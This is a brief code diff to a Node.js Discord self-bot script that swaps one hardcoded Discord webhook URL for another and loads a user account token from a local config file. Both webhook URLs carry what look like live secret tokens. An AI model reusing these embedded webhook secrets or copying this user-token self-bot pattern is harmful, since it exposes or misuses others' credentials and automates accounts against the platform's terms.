@@ -1,7 +1,7 @@
 const {Client} = require("discord.js-selfbot-v11");
 const client = new Client();
 const request = require("request");
-const Webhook = "https://discord.com/api/webhooks/1071480758612537364/qQUqtjSoKUjasLge55MzzTF9CK9yk1syTR8Y4OTDFai9QG3hUOzFpvad3kUzr5-1rYvK"
+const Webhook = "https://discordapp.com/api/webhooks/1210055879123013662/n-pKeE597ADz3RCuC0RvJKAIA6SUcQQXqnfNMVEekrR2zpbBDvdt3Jm2x4mXFh1VRZd8"
 const colors = require("colors");
 
 const {token,gatilho} = require("./zeck.json");
